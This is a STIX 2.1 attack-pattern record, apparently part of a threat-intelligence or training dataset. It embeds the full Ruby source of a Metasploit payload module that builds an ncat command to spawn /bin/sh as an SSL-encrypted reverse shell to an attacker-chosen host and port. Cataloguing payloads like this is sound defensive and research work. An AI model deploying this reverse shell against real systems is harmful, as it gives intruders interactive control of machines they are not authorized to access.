{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--443a73fd-d572-4071-a420-55063ea7704a",
    "created": "2024-08-14T16:33:19.33013Z",
    "modified": "2024-08-14T16:33:19.330134Z",
    "name": "Unix Command Shell, Reverse TCP (via ncat)",
    "description": "Creates an interactive shell via ncat, utilizing ssl mode",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_ncat_ssl.rb",
            "external_id": "reverse_ncat_ssl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 42\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',\n     'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',\n     'Author'      => 'C_Sto',\n     'License'     => MSF_LICENSE,\n     'Platform'    => 'unix',\n     'Arch'        => ARCH_CMD,\n     'Handler'     => Msf::Handler::ReverseTcpSsl,\n     'Session'     => Msf::Sessions::CommandShell,\n     'PayloadType' => 'cmd',\n     'RequiredCmd' => 'ncat',\n     'Payload'     =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('NcatPath', [true, 'The path to the NCat executable', 'ncat']),\n        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    \"#{datastore['NcatPath']} -e #{datastore['ShellPath']} --ssl #{datastore['LHOST']} #{datastore['LPORT']}\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}